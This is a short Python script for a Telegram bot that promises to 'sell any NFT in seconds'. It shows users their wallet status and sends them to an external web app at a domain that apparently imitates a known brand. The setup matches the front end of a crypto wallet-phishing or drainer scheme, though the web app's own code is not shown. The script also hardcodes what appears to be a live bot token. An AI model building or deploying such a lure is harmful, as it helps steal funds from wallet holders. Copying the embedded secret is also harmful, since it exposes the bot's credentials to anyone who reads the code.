import telebot
from telebot import types

bot = telebot.TeleBot("7162979287:AAEUX5BD5NIrgBI4W6tSG8pvEa_2ejcaGJU")

def format_nft_seller_info(wallet_status, nfts_status, user_id_status, total_status):
    formatted_info = (
        "Crypto bot that will sell any NFT in seconds! Just specify the amount and your Wallet🌀 🛍️\n\n"
        f"ℹ️Wallet: {wallet_status}\n"
        f"ℹ️NFTs: {nfts_status}\n"
        f"ℹ️User_id: {user_id_status}\n"
        f"ℹ️Total: {total_status} TON\n\n"
        "Please open Webapp to continue"
    )
    return formatted_info

@bot.message_handler(commands=['start'])
def handle_start(message):
    wallet_status = "❌"
    nfts_status = "❌"
    user_id_status = "✅"
    total_status = 0

    formatted_info = format_nft_seller_info(wallet_status, nfts_status, user_id_status, total_status)

    web_app = types.WebAppInfo(url="https://abacusai-coin.com/")

    markup = types.InlineKeyboardMarkup()
    item = types.InlineKeyboardButton(text="Webapp", web_app=web_app)
    markup.add(item)
    
    bot.send_message(message.chat.id, 
                     formatted_info, 
                     reply_markup=markup, 
                     disable_web_page_preview=True)

@bot.message_handler(func=lambda message: True)
def handle_unknown(message):
    bot.send_message(message.chat.id, "Sorry, I didn't understand that command. If you need assistance, please use the /start command.")

bot.polling()
